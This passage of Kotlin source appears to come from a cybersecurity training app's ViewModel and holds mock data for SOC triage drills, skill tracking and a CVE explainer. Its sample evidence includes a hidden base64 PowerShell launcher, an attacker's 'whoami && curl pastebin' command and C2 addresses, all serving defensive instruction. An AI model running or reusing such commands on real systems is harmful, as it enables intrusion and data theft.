    _crossDeviceSession.value = _crossDeviceSession.value.copy(
      lastActiveTimestamp = "Just now",
      syncStatus = NetworkSyncStatus.SYNCED,
      isConflictPresent = false
    )
  }

  fun resolveCrossDeviceConflict(useRemote: Boolean) {
    _crossDeviceSession.value = _crossDeviceSession.value.copy(
      isConflictPresent = false,
      syncStatus = NetworkSyncStatus.SYNCED,
      lastActiveTimestamp = "Resolved just now"
    )
    _networkSyncStatus.value = NetworkSyncStatus.SYNCED
  }

  fun recordCrossDeviceActivity(title: String, category: String, progress: String, screenTag: String) {
    _crossDeviceSession.value = _crossDeviceSession.value.copy(
      lastActivityTitle = title,
      lastActivityCategory = category,
      lastActivityProgress = progress,
      lastActiveTimestamp = "Active right now",
      originDeviceName = "Current Device",
      targetScreenTag = screenTag,
      syncStatus = _networkSyncStatus.value
    )
  }

  // =========================================================================
  // LIVING INTELLIGENCE LAYER: 7 FUTURE CAPABILITIES (REAL DATA ENFORCEMENT)
  // =========================================================================

  // 1. Living Skill Constellation Live State
  private val _constellationNodes = MutableStateFlow(
    listOf(
      ConstellationNode(
        skillId = "skill_net_01",
        skillName = "TCP/IP & Packet Anatomy",
        domain = "Core Networking",
        retentionPercent = 92,
        masteryPercent = 88,
        decayRiskLevel = "LOW",
        lastPracticedDaysAgo = 2,
        normalizedX = -0.55f,
        normalizedY = -0.45f,
        normalizedZ = 0.2f,
        connectedSkillIds = listOf("skill_net_02", "skill_sys_01"),
        recommendedDiagnosticTitle = "Wireshark PCAP Filter Drill"
      ),
      ConstellationNode(
        skillId = "skill_net_02",
        skillName = "DNS Tunneling & Poisoning",
        domain = "Core Networking",
        retentionPercent = 78,
        masteryPercent = 72,
        decayRiskLevel = "MEDIUM",
        lastPracticedDaysAgo = 8,
        normalizedX = -0.2f,
        normalizedY = -0.65f,
        normalizedZ = -0.1f,
        connectedSkillIds = listOf("skill_net_01", "skill_soc_02"),
        recommendedDiagnosticTitle = "DNS Tunneling IOC Extraction"
      ),
      ConstellationNode(
        skillId = "skill_sys_01",
        skillName = "Linux CLI Forensics",
        domain = "Systems Telemetry",
        retentionPercent = 48,
        masteryPercent = 65,
        decayRiskLevel = "CRITICAL",
        lastPracticedDaysAgo = 19,
        normalizedX = -0.6f,
        normalizedY = 0.25f,
        normalizedZ = -0.4f,
        connectedSkillIds = listOf("skill_net_01", "skill_soc_01"),
        recommendedDiagnosticTitle = "auth.log & auditd CLI Triage"
      ),
      ConstellationNode(
        skillId = "skill_sys_02",
        skillName = "Windows Event IDs",
        domain = "Systems Telemetry",
        retentionPercent = 62,
        masteryPercent = 70,
        decayRiskLevel = "HIGH",
        lastPracticedDaysAgo = 14,
        normalizedX = -0.25f,
        normalizedY = 0.45f,
        normalizedZ = 0.3f,
        connectedSkillIds = listOf("skill_sys_01", "skill_soc_01", "skill_ad_01"),
        recommendedDiagnosticTitle = "Event 4624/4625 Anomaly Matrix"
      ),
      ConstellationNode(
        skillId = "skill_soc_01",
        skillName = "Sysmon & EDR Telemetry",
        domain = "SOC Defense",
        retentionPercent = 84,
        masteryPercent = 81,
        decayRiskLevel = "LOW",
        lastPracticedDaysAgo = 3,
        normalizedX = 0.15f,
        normalizedY = 0.1f,
        normalizedZ = 0.5f,
        connectedSkillIds = listOf("skill_sys_02", "skill_soc_02", "skill_hunt_01"),
        recommendedDiagnosticTitle = "Process Injection & Sysmon 10"
      ),
      ConstellationNode(
        skillId = "skill_soc_02",
        skillName = "SIEM Log Correlation",
        domain = "SOC Defense",
        retentionPercent = 58,
        masteryPercent = 68,
        decayRiskLevel = "HIGH",
        lastPracticedDaysAgo = 16,
        normalizedX = 0.45f,
        normalizedY = -0.3f,
        normalizedZ = -0.2f,
        connectedSkillIds = listOf("skill_soc_01", "skill_hunt_01"),
        recommendedDiagnosticTitle = "Multi-Source Timestamp Alignment"
      ),
      ConstellationNode(
        skillId = "skill_ad_01",
        skillName = "Kerberoasting & AD Defense",
        domain = "Identity Security",
        retentionPercent = 51,
        masteryPercent = 60,
        decayRiskLevel = "CRITICAL",
        lastPracticedDaysAgo = 21,
        normalizedX = 0.35f,
        normalizedY = 0.6f,
        normalizedZ = -0.5f,
        connectedSkillIds = listOf("skill_sys_02", "skill_soc_01"),
        recommendedDiagnosticTitle = "Event 4769 RC4 Downgrade Triage"
      ),
      ConstellationNode(
        skillId = "skill_hunt_01",
        skillName = "Hypothesis Threat Hunting",
        domain = "Proactive Defense",
        retentionPercent = 73,
        masteryPercent = 75,
        decayRiskLevel = "MEDIUM",
        lastPracticedDaysAgo = 7,
        normalizedX = 0.7f,
        normalizedY = 0.15f,
        normalizedZ = 0.1f,
        connectedSkillIds = listOf("skill_soc_02", "skill_soc_01"),
        recommendedDiagnosticTitle = "Adversary TTP Hunting in Splunk"
      )
    )
  )
  val constellationNodes: StateFlow<List<ConstellationNode>> = _constellationNodes.asStateFlow()

  fun recordSkillPracticed(skillId: String, newRetention: Int = 95) {
    _constellationNodes.value = _constellationNodes.value.map { node ->
      if (node.skillId == skillId) {
        node.copy(
          retentionPercent = newRetention,
          decayRiskLevel = "LOW",
          lastPracticedDaysAgo = 0,
          masteryPercent = (node.masteryPercent + 4).coerceAtMost(100)
        )
      } else node
    }
  }

  // 2. Ambient Co-Pilot Persistent State
  private val _activeAmbientObservation = MutableStateFlow<AmbientObservation?>(
    AmbientObservation(
      id = "obs_init_01",
      screenContext = "home_radar",
      observationText = "Linux CLI Forensics retention dropped to 48% (19 days inactive). Master this to unlock your Month 1 Milestone.",
      groundingSource = "Skill Decay Forecast: Linux Forensics",
      suggestedPrompt = "Help me review Linux auth.log triage commands"
    )
  )
  val activeAmbientObservation: StateFlow<AmbientObservation?> = _activeAmbientObservation.asStateFlow()

  fun setAmbientObservation(observation: AmbientObservation?) {
    _activeAmbientObservation.value = observation
  }

  fun dismissAmbientObservation() {
    _activeAmbientObservation.value = null
  }

  // 3. Grounded Predictive Next-Action Engine
  private val _predictiveNextActions = MutableStateFlow(
    listOf(
      PredictiveNextAction(
        id = "act_01",
        title = "Diagnostic Review: Linux CLI Forensics",
        category = "Decay Prevention",
        destinationTag = "lesson_detail",
        urgencyScore = 96,
        primaryReason = "Retention dropped to 48% (below 60% baseline). It is a prerequisite for your active Phase 1 Linux Log Triage project.",
        reasoningTags = listOf("Decay Risk: Critical", "Phase 1 Prerequisite", "Target: SOC Analyst"),
        estimatedMins = 8,
        xpReward = 120,
        telemetryMetric = "Retention: 48% (Threshold: 60%)"
      ),
      PredictiveNextAction(
        id = "act_02",
        title = "Multi-Source Timestamp Alignment",
        category = "Mistake Remediation",
        destinationTag = "live_soc_range",
        urgencyScore = 88,
        primaryReason = "Your Learning Genome flagged 'Investigation Correlation & Timestamp Triage' as your #1 operational bottleneck.",
        reasoningTags = listOf("Genome Bottleneck", "Cognitive Focus", "MITRE T1059"),
        estimatedMins = 15,
        xpReward = 200,
        telemetryMetric = "Correlation Accuracy: 58%"
      ),
      PredictiveNextAction(
        id = "act_03",
        title = "Kerberoasting RC4 Anomaly Drill",
        category = "Identity Defense",
        destinationTag = "lab_simulator",
        urgencyScore = 82,
        primaryReason = "Unpracticed for 21 days with 51% retention. Required for enterprise Active Directory defense readiness.",
        reasoningTags = listOf("Decay Risk: Critical", "Identity Gap"),
        estimatedMins = 12,
        xpReward = 180,
        telemetryMetric = "Retention: 51% (Threshold: 60%)"
      ),
      PredictiveNextAction(
        id = "act_04",
        title = "Daily Spaced Repetition Queue (3 Cards)",
        category = "Spaced Review",
        destinationTag = "knowledge_vault",
        urgencyScore = 75,
        primaryReason = "3 high-priority flashcards are due today (TCP handshake flags, Sysmon Event IDs, and DNS tunneling).",
        reasoningTags = listOf("Spaced Interval Due", "Streak Protection"),
        estimatedMins = 5,
        xpReward = 80,
        telemetryMetric = "3 Cards Due"
      )
    )
  )
  val predictiveNextActions: StateFlow<List<PredictiveNextAction>> = _predictiveNextActions.asStateFlow()

  // 4. Multi-Modal Fusion Session State
  private val _multiModalFusionSession = MutableStateFlow(
    MultiModalFusionSession(
      sessionId = "fusion_sess_01",
      scenarioTitle = "Multi-Modal Triage: APT29 Reflective DLL & Kerberoast",
      attackChainSummary = "Adversary established Initial Access via spear-phishing macro on Workstation-04 and is attempting Kerberoast ticket requests against Domain Controller DC01.",
      targetRole = "SOC Analyst L2",
      isLiveAudioActive = false,
      activeTranscript = listOf(
        Pair("AEGORA SOC Lead (AI)", "Analyst, we are seeing anomalous Kerberos ticket requests on DC01. Look at the on-screen process tree and telemetry nodes."),
        Pair("Alex Vance (You)", "Checking now. The parent process is winword.exe launching powershell.exe with an encoded command.")
      ),
      evidenceNodes = listOf(
        FusionEvidenceNode(
          id = "fev_01",
          label = "Sysmon Event ID 1: WINWORD -> PowerShell",
          category = "PROCESS_TREE",
          details = "PID 4812 spawned powershell.exe -Enc JABj... from winword.exe",
          timestampUtc = "02:14:02 UTC",
          isFlaggedSuspicious = true,
          isCurrentlyDiscussedInAudio = true,
          visualCoordinates = Pair(0.2f, 0.3f)
        ),
        FusionEvidenceNode(
          id = "fev_02",
          label = "Outbound TCP 185.220.101.5:443",
          category = "NETWORK_FLOW",
          details = "Established HTTPS connection to known Tor Exit / C2 node",
          timestampUtc = "02:14:08 UTC",
          isFlaggedSuspicious = true,
          isCurrentlyDiscussedInAudio = false,
          visualCoordinates = Pair(0.6f, 0.25f)
        ),
        FusionEvidenceNode(
          id = "fev_03",
          label = "Event 4769: Kerberos Ticket (RC4 0x17)",
          category = "AUTH_EVENT",
          details = "SPN MSSQLSvc/sql01.corp requested with legacy RC4 cipher",
          timestampUtc = "02:14:19 UTC",
          isFlaggedSuspicious = true,
          isCurrentlyDiscussedInAudio = true,
          visualCoordinates = Pair(0.5f, 0.7f)
        ),
        FusionEvidenceNode(
          id = "fev_04",
          label = "Memory Artifact: Reflective Loader",
          category = "MEMORY_ARTIFACT",
          details = "PAGE_EXECUTE_READWRITE memory allocation in spoolsv.exe space",
          timestampUtc = "02:14:35 UTC",
          isFlaggedSuspicious = true,
          isCurrentlyDiscussedInAudio = false,
          visualCoordinates = Pair(0.8f, 0.65f)
        )
      ),
      selectedNodeId = "fev_01"
    )
  )
  val multiModalFusionSession: StateFlow<MultiModalFusionSession> = _multiModalFusionSession.asStateFlow()

  fun selectFusionEvidenceNode(nodeId: String) {
    _multiModalFusionSession.value = _multiModalFusionSession.value.copy(
      selectedNodeId = nodeId,
      evidenceNodes = _multiModalFusionSession.value.evidenceNodes.map { node ->
        node.copy(isCurrentlyDiscussedInAudio = node.id == nodeId)
      }
    )
  }

  fun toggleLiveAudio(isActive: Boolean) {
    _multiModalFusionSession.value = _multiModalFusionSession.value.copy(isLiveAudioActive = isActive)
  }

  fun addFusionTranscriptTurn(speaker: String, text: String, highlightedNodeId: String? = null) {
    val current = _multiModalFusionSession.value
    val newTranscript = current.activeTranscript + Pair(speaker, text)
    val updatedNodes = current.evidenceNodes.map { node ->
      node.copy(isCurrentlyDiscussedInAudio = node.id == highlightedNodeId)
    }
    _multiModalFusionSession.value = current.copy(
      activeTranscript = newTranscript,
      evidenceNodes = updatedNodes,
      selectedNodeId = highlightedNodeId ?: current.selectedNodeId
    )
  }

  // 5. Generative Scenario Variants Scale & Audit History
  private val _generatedScenariosLog = MutableStateFlow(
    listOf(
      GeneratedScenarioRecord(
        id = "gen_001",
        baseConceptTitle = "PowerShell Encoded Command",
        generatedTitle = "Adversary Variant: Base64 Reflective Loader in Finance",
        targetMitreTactic = "T1059.001",
        dynamicIocs = listOf("185.220.101.99", "SHA256: 4f53cda18...", "User: fin_clerk_02"),
        targetHostname = "srv-payroll-03.corp",
        attackTimestampUtc = "03:41:19 UTC",
        rawLogPayload = "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3... Host: srv-payroll-03.corp",
        rubric = ScenarioRubricEvaluation(
          mitreAlignmentPassed = true,
          solvabilityConfidencePercent = 96,
          chronologicalIntegrityPassed = true,
          benignVsMaliciousClarityScore = 92,
          reviewerNotes = "Clear process parentage and identifiable IOC trail."
        ),
        generatedAt = "20 mins ago"
      ),
      GeneratedScenarioRecord(
        id = "gen_002",
        baseConceptTitle = "Kerberoast SPN Request",
        generatedTitle = "Adversary Variant: Legacy RC4 Ticket Extraction on DC-Backup",
        targetMitreTactic = "T1558.003",
        dynamicIocs = listOf("192.168.1.188", "SPN: MSSQLSvc/db-cluster", "Enc: 0x17"),
        targetHostname = "dc-backup.corp.internal",
        attackTimestampUtc = "03:44:05 UTC",
        rubric = ScenarioRubricEvaluation(
          mitreAlignmentPassed = true,
          solvabilityConfidencePercent = 93,
          chronologicalIntegrityPassed = true,
          benignVsMaliciousClarityScore = 95,
          reviewerNotes = "Event 4769 parameters verified against Kerberos specifications."
        ),
        rawLogPayload = "Event 4769: A Kerberos service ticket was requested. Service Name: MSSQLSvc/db-cluster Ticket Options: 0x40810000 Ticket Encryption Type: 0x17",
        generatedAt = "1 hour ago"
      )
    )
  )
  val generatedScenariosLog: StateFlow<List<GeneratedScenarioRecord>> = _generatedScenariosLog.asStateFlow()

  fun recordGeneratedScenario(record: GeneratedScenarioRecord) {
    _generatedScenariosLog.value = listOf(record) + _generatedScenariosLog.value
  }

  // 6. Flow & Behavioral Pacing Engine
  private val _behavioralPacing = MutableStateFlow(
    BehavioralPacingSuggestion(
      sessionDurationMins = 38,
      recentMistakeCount = 2,
      consecutiveTriageCount = 6,
      shouldSuggestPacing = true,
      questionPrompt = "Noticed a couple of tough triage correlations in this session. Want a lighter 10-minute flashcard review or a quick pause?",
      suggestedActionTitle = "Switch to 10m Spaced Flashcards",
      suggestedActionTag = "knowledge_vault"
    )
  )
  val behavioralPacing: StateFlow<BehavioralPacingSuggestion> = _behavioralPacing.asStateFlow()

  fun dismissBehavioralPacing() {
    _behavioralPacing.value = _behavioralPacing.value.copy(shouldSuggestPacing = false)
  }

  // 7. Cross-Session Memory Registry
  private val _topicHistoricalMemories = MutableStateFlow(
    mapOf(
      "top_103" to TopicHistoricalMemory(
        topicId = "top_103",
        topicName = "Linux CLI Forensics & /var/log Triage",
        lastStudiedDate = "19 days ago",
        daysSinceLastAttempt = 19,
        priorScore = 65,
        pastMistakeNoted = "Flagged timestamp correlation late & missed /var/log/audit/audit.log",
        proactiveGuidanceMessage = "Welcome back to Linux Triage. In your previous session, you flagged the timestamp correlation late. Today, inspect auth.log timestamps before executing grep filters."
      ),
      "top_104" to TopicHistoricalMemory(
        topicId = "top_104",
        topicName = "Windows Event IDs & Security Architecture",
        lastStudiedDate = "14 days ago",
        daysSinceLastAttempt = 14,
        priorScore = 70,
        pastMistakeNoted = "Confused Event ID 4624 Logon Type 3 (Network) with Type 10 (RDP)",
        proactiveGuidanceMessage = "Welcome back. In your last run, you mixed up Logon Type 3 (Network SMB) and Type 10 (RemoteInteractive RDP). Keep that distinction sharp today!"
      ),
      "top_201" to TopicHistoricalMemory(
        topicId = "top_201",
        topicName = "Sysmon Deployment & Event ID Mapping",
        lastStudiedDate = "3 days ago",
        daysSinceLastAttempt = 3,
        priorScore = 84,
        pastMistakeNoted = null,
        proactiveGuidanceMessage = "Great progress on Sysmon! You scored 84% on Event ID 1 & 3 rules 3 days ago. Ready to advance to Event ID 7 DLL side-loading?"
      )
    )
  )
  val topicHistoricalMemories: StateFlow<Map<String, TopicHistoricalMemory>> = _topicHistoricalMemories.asStateFlow()

  fun getHistoricalMemoryForTopic(topicId: String): TopicHistoricalMemory? {
    return _topicHistoricalMemories.value[topicId]
  }

  // ============================================================================
  // AEGORA v7.0 CYBER ECOSYSTEM DATA FLOWS
  // ============================================================================

  // 1. Cyber Learning Genome 2.0 State
  private val _cyberLearningGenomeV7 = MutableStateFlow(
    CyberLearningGenomeV7(
      callsign = "VANCE-SOC",
      dimensions = listOf(
        GenomeDimensionNode("dim_know", "Core Knowledge & Standards", 78, 24, "HIGH", DimensionTrend.STEADY_GROWTH, 82, emptyList(), "Complete RFC 8446 TLS 1.3 Key Exchange Deep Dive", "2 days ago", "10-Item Diagnostic"),
        GenomeDimensionNode("dim_pract", "Practical Hands-On Triage", 71, 19, "HIGH", DimensionTrend.STEADY_GROWTH, 75, listOf("TCP Windowing & Flags"), "Live SOC Triage: 3 Multi-Host Intrusions", "Yesterday", "Live SOC Evaluation"),
        GenomeDimensionNode("dim_invest", "Forensic Investigation Depth", 64, 14, "MEDIUM", DimensionTrend.AT_RISK_DECAY, 68, listOf("Sysmon Event ID 7 DLL Injection"), "Execute 2 Blind Unlabeled Investigations", "4 days ago", "Unscripted PCAP Rebuild"),
        GenomeDimensionNode("dim_reason", "Hypothesis & Causal Reasoning", 73, 17, "HIGH", DimensionTrend.STEADY_GROWTH, 78, emptyList(), "Counterfactual Reasoning Scenario", "3 days ago", "Alternative Hypothesis Drill"),
        GenomeDimensionNode("dim_decide", "Decision Making Under Pressure", 61, 11, "MEDIUM", DimensionTrend.BLOCKED_BY_PREREQ, 62, listOf("Host Isolation Blast Radius Policy"), "Crisis War Room Session with 15m Timer", "5 days ago", "Manager Handoff Review"),
        GenomeDimensionNode("dim_comm", "Stakeholder Communication", 82, 16, "HIGH", DimensionTrend.RAPIDLY_ASCENDING, 89, emptyList(), "CISO & Legal Briefing Translation", "Yesterday", "Executive Summary Scorecard"),
        GenomeDimensionNode("dim_trans", "Cross-Domain Transfer", 58, 8, "PROVISIONAL", DimensionTrend.AT_RISK_DECAY, 54, listOf("Kubernetes Audit Log Structure"), "Transfer Test: Windows Event ID 4688 to K8s Exec Logs", "7 days ago", "Novel Transfer Challenge"),
        GenomeDimensionNode("dim_retent", "Spaced Retention & Memory", 69, 32, "HIGH", DimensionTrend.STEADY_GROWTH, 71, emptyList(), "15-Minute Spaced Flashcard Review", "Today", "Ebbinghaus Review Run")
      ),
      learningVelocity = "HIGH",
      currentPrimaryBottleneck = "Cross-Domain Log Correlation (Windows Event Logs -> Cloud Kubernetes Audit Logs)",
      confidenceCalibration = "WELL_CALIBRATED",
      evidenceIntegrityScore = 94,
      nextTargetInterventions = listOf(
        "3 Correlation Investigations (Sysmon ID 1 + ID 3 + Windows 4688)",
        "1 Blind Investigation without threat labels",
        "1 Novel Transfer Challenge (Cloud Kubernetes Triage)"
      )
    )
  )
  val cyberLearningGenomeV7: StateFlow<CyberLearningGenomeV7> = _cyberLearningGenomeV7.asStateFlow()

  // 2. Investigation Fingerprint & Training Reference Model
  private val _investigationFingerprint = MutableStateFlow(
    InvestigationFingerprintReport(
      reportId = "ifp_2026_091",
      metrics = listOf(
        InvestigationFingerprintMetric("Evidence-First Investigation", 82, 85, "METHODOLOGY", "Strong preference to verify raw pcap before guessing"),
        InvestigationFingerprintMetric("Timeline & Temporal Analysis", 71, 80, "METHODOLOGY", "Consistently builds chronological sequence of events"),
        InvestigationFingerprintMetric("Cross-Source IOC Correlation", 63, 78, "TOOL_FLUENCY", "Tends to analyze endpoint logs before correlating with firewall"),
        InvestigationFingerprintMetric("Context & Baseline Checking", 48, 75, "METHODOLOGY", "Occasionally skips verifying if user is expected admin on host"),
        InvestigationFingerprintMetric("Hypothesis Falsification Testing", 77, 82, "COGNITIVE_BIAS", "Actively tests alternative explanations before closing alert")
      ),
      prematureClosureRisk = "MEDIUM",
      evidenceFirstRatio = 82,
      timelineUsageRatio = 71,
      iocCorrelationRatio = 63,
      contextValidationRatio = 48,
      hypothesisTestingRatio = 77,
      recommendedRemediationDrill = "Execute Context Baseline Validation Drill (Verify asset ownership & normal working hours before containment)"
    )
  )
  val investigationFingerprint: StateFlow<InvestigationFingerprintReport> = _investigationFingerprint.asStateFlow()

  // 3. Knowledge Transfer Engine Tests
  private val _knowledgeTransferTests = MutableStateFlow(
    listOf(
      KnowledgeTransferTest(
        id = "trans_001",
        sourceConceptTitle = "Windows Event ID 4688 (Process Creation with Command Line)",
        transferScenarioTitle = "Kubernetes Pod Container Command Execution (audit.k8s.io)",
        domainContext = "Cloud Native Infrastructure / EKS Cluster",
        transferPrompt = "You have identified an attacker running 'whoami && curl pastebin' via Windows CMD in Lab 03. How does this exact same command injection intent manifest in Kubernetes API server audit logs for a pod exec request?",
        measuredDimensions = listOf("Recall", "Application", "Transfer", "Generalization"),
        currentStatus = TransferStatus.DEMONSTRATED,
        evaluationFeedback = "Accurately recognized 'pods/exec' subresource verb and 'command' query parameters in K8s JSON audit payload.",
        remediationDrill = "Practice AWS CloudTrail assume-role transfer test next."
      ),
      KnowledgeTransferTest(
        id = "trans_002",
        sourceConceptTitle = "TCP SYN Flood & Half-Open Handshake Exhaustion",
        transferScenarioTitle = "HTTP/2 Rapid Reset Attack (CVE-2023-44487)",
        domainContext = "Application Layer DDoS / Web Server Architecture",
        transferPrompt = "Explain how the resource exhaustion mechanics of a Layer 4 TCP SYN flood translate to the multiplexed stream cancellation behavior of HTTP/2 RST_STREAM frames.",
        measuredDimensions = listOf("Underlying Protocol Reasoning", "Resource Bound Analysis", "Defensive Mitigations"),
        currentStatus = TransferStatus.PARTIAL,
        evaluationFeedback = "Understands stream exhaustion, but missed server-side request concurrency tracking limit nuance.",
        remediationDrill = "Review RFC 7540 HTTP/2 Stream States & NGINX keepalive timeout controls."
      )
    )
  )
  val knowledgeTransferTests: StateFlow<List<KnowledgeTransferTest>> = _knowledgeTransferTests.asStateFlow()

  // 4. Concept Collision Matrix 2.0
  private val _conceptCollisionPairs = MutableStateFlow(
    listOf(
      ConceptCollisionPair(
        id = "col_001",
        conceptA = "SIEM (Security Information & Event Mgmt)",
        conceptB = "SOAR (Security Orchestration, Automation & Response)",
        confusionRatePercent = 64,
        coreDistinction = "SIEM aggregates, indexes, and correlates telemetry for detection; SOAR executes automated playbooks and API actions for containment.",
        practicalTrapExample = "Thinking Splunk Enterprise Core automatically isolates infected endpoints without Phantom/SOAR integration.",
        microDrillTitle = "Classify 10 Architecture Components as SIEM Ingest vs SOAR Playbook",
        isResolved = false
      ),
      ConceptCollisionPair(
        id = "col_002",
        conceptA = "Authentication (Who are you?)",
        conceptB = "Authorization (What are you allowed to do?)",
        confusionRatePercent = 38,
        coreDistinction = "Authentication verifies identity via credentials/FIDO2; Authorization evaluates permissions and RBAC/ABAC policies.",
        practicalTrapExample = "Treating a valid JWT signature as proof the user is authorized to delete a database tenant.",
        microDrillTitle = "Identify 5 Vulnerabilities as Broken Auth (CWE-287) vs Broken Access Control (CWE-862)",
        isResolved = true
      ),
      ConceptCollisionPair(
        id = "col_003",
        conceptA = "Hashing (One-way deterministic digest)",
        conceptB = "Encryption (Two-way reversible confidentiality)",
        confusionRatePercent = 29,
        coreDistinction = "Hashing cannot be reversed back to plain text; Encryption uses cryptographic keys to decrypt ciphertext.",
        practicalTrapExample = "Claiming passwords should be 'encrypted with AES' rather than hashed with Argon2id and salt.",
        microDrillTitle = "Match 8 Cryptographic Primitives to Hash, Symmetric Cipher, or Asymmetric Signature",
        isResolved = true
      )
    )
  )
  val conceptCollisionPairs: StateFlow<List<ConceptCollisionPair>> = _conceptCollisionPairs.asStateFlow()

  // 5. Reverse Job Roadmap State
  private val _reverseJobRoadmap = MutableStateFlow(
    ReverseJobRoadmapResult(
      jobTitle = "SOC Analyst (Level 1) — Cyber Defense Operations",
      targetCompanyOrSector = "Enterprise Financial Services / Managed MSSP",
      rawDescriptionSample = "Seeking Junior SOC Analyst. Required: SIEM (Splunk/Sentinel), TCP/IP packet analysis, Windows Event Log investigation (Event IDs 4624, 4688, 4720), EDR telemetry (CrowdStrike/Defender), basic Python scripting for triage automation.",
      extractedSkills = listOf(
        JobSkillMatch("SIEM Alert Triage (Splunk/Wazuh)", true, 84, "Required", 1),
        JobSkillMatch("TCP/IP & Wireshark PCAP Filtering", true, 78, "Required", 2),
        JobSkillMatch("Windows Event Logs & Sysmon", true, 72, "Required", 3),
        JobSkillMatch("EDR Investigation & Host Isolation", false, 48, "Required", 4),
        JobSkillMatch("Python Scripting for Log Parsing", false, 35, "Preferred", 5),
        JobSkillMatch("Phishing Email Header Analysis", true, 88, "Required", 6)
      ),
      aegoraTrainingMatchScore = 71,
      shortestEvidenceGapPlan = listOf(
        "Priority 1: Complete EDR Live Host Isolation Lab (Estimated: 45 mins)",
        "Priority 2: Python Regex Automation Script for Apache Access Logs (Estimated: 30 mins)",
        "Priority 3: Publish Skill Passport verified credential for Windows Forensics"
      ),
      recommendedNextProject = "Automated PCAP & Sysmon Log Correlation Pipeline in Python"
    )
  )
  val reverseJobRoadmap: StateFlow<ReverseJobRoadmapResult> = _reverseJobRoadmap.asStateFlow()

  // 6. Stakeholder Translation Engine
  private val _stakeholderTranslations = MutableStateFlow(
    listOf(
      StakeholderTranslationSubmission(
        audience = StakeholderAudience.SOC_PEER,
        learnerSummaryText = "Host WIN-FIN-04 infected via malicious macro in invoice.doc. Spawned powershell.exe -enc connecting to C2 IP 198.51.100.44:8443. SHA-256 hash verified. Endpoint isolated in EDR.",
        accuracyScore = 95,
        clarityScore = 92,
        businessImpactScore = 70,
        jargonControlScore = 96,
        actionabilityScore = 94,
        feedbackCritique = "Excellent technical precision. Exact C2 indicators and hashes provided cleanly."
      ),
      StakeholderTranslationSubmission(
        audience = StakeholderAudience.CISO,
        learnerSummaryText = "Single workstation in Finance was compromised via phishing. Workstation was immediately isolated within 8 minutes of alert. Zero evidence of lateral movement to payroll DB. Regulatory reporting not triggered.",
        accuracyScore = 90,
        clarityScore = 94,
        businessImpactScore = 92,
        jargonControlScore = 88,
        actionabilityScore = 90,
        feedbackCritique = "Outstanding executive summary. Answers blast radius, containment timing, and regulatory impact without drowning in raw hashes."
      )
    )
  )
  val stakeholderTranslations: StateFlow<List<StakeholderTranslationSubmission>> = _stakeholderTranslations.asStateFlow()

  // 7. Cyber Intelligence Explainer Items
  private val _cyberIntelligenceExplainers = MutableStateFlow(
    listOf(
      CyberIntelligenceExplainerItem(
        id = "cve_2026_01",
        cveOrThreatTitle = "CVE-2024-3094: XZ Utils Backdoor & SSH Authentication Bypass",
        sourceTier = IntelligenceSourceTier.OFFICIAL_ADVISORY,
        publicationDate = "2024-03-29 (Updated Reference)",
        retrievedTimestamp = "2026-08-27 12:00 UTC",
        confidenceScore = 99,
        whatHappened = "Sophisticated multi-year supply chain backdoor injected into upstream xz/liblzma tarballs, targeting OpenSSH server authentication during RSA decryption.",
        whoIsAffected = "Linux distributions shipping vulnerable xz-utils versions 5.6.0 and 5.6.1 with patched OpenSSH linking to liblzma.",
        whyItMatters = "Allows unauthorized remote code execution and SSH authentication bypass by providing a crafted signature certificate matching attacker private key.",
        technicalRootCause = "Malicious M4 macro in build-to-pkg script injected compiled binary payload directly into liblzma Makefile during release tarball creation.",
        attackPathBreakdown = "Supply Chain -> Upstream Git Commit -> Obfuscated Test Payload -> Tarball Extraction -> liblzma build -> OpenSSH linkage -> RSA verification hijack.",
        detectionSigmaRule = "Sigma: Check library checksums of liblzma.so.5.6.0 & detect unexpected child processes of sshd.",
        mitigationAndPatch = "Downgrade xz-utils to 5.4.x stable or upgrade to vendor remediated releases immediately.",
        relatedMitreTechniques = listOf("T1195.001 - Supply Chain Compromise", "T1556 - Modify Authentication Process"),
        relatedAegoraSkills = listOf("Linux Forensics", "Binary Disassembly", "Supply Chain Hardening"),
        practiceLabRoute = "binary_disassembler",
        officialSourceLink = "https://nvd.nist.gov/vuln/detail/CVE-2024-3094"
      )
    )
  )
  val cyberIntelligenceExplainers: StateFlow<List<CyberIntelligenceExplainerItem>> = _cyberIntelligenceExplainers.asStateFlow()

  // ============================================================================
  // AEGORA v8.0 AUTONOMOUS CYBER LEARNING & CAREER ECOSYSTEM DATA FLOWS
  // ============================================================================

  // 1. Cyber Twin 2.0 State with dynamic evidence trail
  private val _cyberTwinV8 = MutableStateFlow(
    CyberTwinV8State(
      callsign = "VANCE-SOC",
      targetCareerRole = "SOC Analyst (Level 1) — Cyber Defense",
      overallCareerReadinessPercent = 69,
      readinessStatus = "DEVELOPING",
      primaryBlocker = "Incident Communication under Executive Pressure",
      learningVelocity = "ACCELERATING",
      confidenceCalibrationState = "WELL_CALIBRATED (±4%)",
      evidenceIntegrityScore = 96,
      vectors = listOf(
        CompetencyEvidenceVector(
          dimensionKey = "KNOWLEDGE",
          title = "Cybersecurity Knowledge & Protocol Theory",
          score = 82,
          benchmarkTarget = 80,
          confidenceRating = "HIGH_EVIDENCE",
          whyScoreExists = "Mastered RFC 8446 TLS 1.3, TCP 3-Way Handshake, and Sysmon Schema across 28 validated quiz items.",
          proofCount = 28,
          recentEvidenceSources = listOf("Quiz 101", "RFC Protocol Lab", "Zero Trust Auth Engine"),
          trendDescription = "Ascending (+5% this week)",
          targetIntervention = "Review Post-Quantum Cryptography Primitives"
        ),
        CompetencyEvidenceVector(
          dimensionKey = "PRACTICAL",
          title = "Hands-On Tool & CLI Proficiency",
          score = 71,
          benchmarkTarget = 75,
          confidenceRating = "HIGH_EVIDENCE",
          whyScoreExists = "Demonstrated Wireshark BPF filtering and Linux log extraction across 14 interactive terminal sessions.",
          proofCount = 14,
          recentEvidenceSources = listOf("Wireshark PCAP Drill", "Linux Terminal Ladder"),
          trendDescription = "Steady (+2%)",
          targetIntervention = "Complete Zeek / Suricata Rule Crafting Lab"
        ),
        CompetencyEvidenceVector(
          dimensionKey = "INVESTIGATION",
          title = "Forensic Investigation & Triage Rigor",
          score = 76,
          benchmarkTarget = 80,
          confidenceRating = "HIGH_EVIDENCE",
          whyScoreExists = "Reconstructed 9 multi-stage malware intrusions using Sysmon Event ID 1 & 3 parent-child correlation.",
          proofCount = 9,
          recentEvidenceSources = listOf("Live SOC Range Lab 04", "Shadow Range"),
          trendDescription = "Ascending (+4%)",
          targetIntervention = "Execute Blind PCAP Carving Drill"
        ),
        CompetencyEvidenceVector(
          dimensionKey = "REASONING",
          title = "Hypothesis Falsification & Causal Thinking",
